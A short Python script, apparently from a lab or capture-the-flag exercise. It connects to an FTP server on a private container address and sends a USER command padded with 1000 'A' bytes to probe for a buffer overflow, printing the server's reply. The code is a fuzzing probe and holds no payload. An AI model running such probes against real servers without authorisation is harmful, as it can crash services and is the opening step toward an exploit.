import socket

FTP_SERVER = "172.17.0.2"
FTP_PORT = 21

control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(f"[+] Conectando")
    control_socket.connect((FTP_SERVER, FTP_PORT))

    # hola
    banner = control_socket.recv(1024).decode()
    print(f"[+] Banner recibido: {banner.strip()}")
    
    long_user = b"USER " + b"A" * 1000 + b"\r\n"
    print(f"[+] Enviando USER con fuzzing ({len(long_user)} bytes)...")
    control_socket.send(long_user)

    # Leer respuesta
    respuesta = control_socket.recv(1024).decode()
    print(f"[+] Respuesta del servidor: {respuesta.strip()}")

finally:
    control_socket.close()
    print("[+] Conexión cerrada")

